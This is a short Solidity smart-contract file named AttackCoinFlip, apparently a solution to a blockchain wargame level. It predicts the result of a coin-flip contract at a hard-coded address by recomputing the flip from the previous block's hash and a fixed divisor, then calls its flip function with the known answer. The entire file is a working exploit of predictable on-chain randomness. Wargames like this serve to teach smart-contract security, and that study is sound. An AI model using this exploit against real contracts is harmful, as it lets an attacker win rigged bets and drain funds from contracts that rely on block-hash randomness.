//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract AttackCoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address cf = 0xC7b47896B5B3ad0cf12b55BdD048E918E2e95343;

    function attack() external {
      uint256 blockValue = uint256(blockhash(block.number-1));

      uint coinFlip = blockValue/FACTOR;
      bool guess = coinFlip == 1 ? true : false;
      
      cf.call(abi.encodeWithSignature("flip(bool)", guess));
    }
}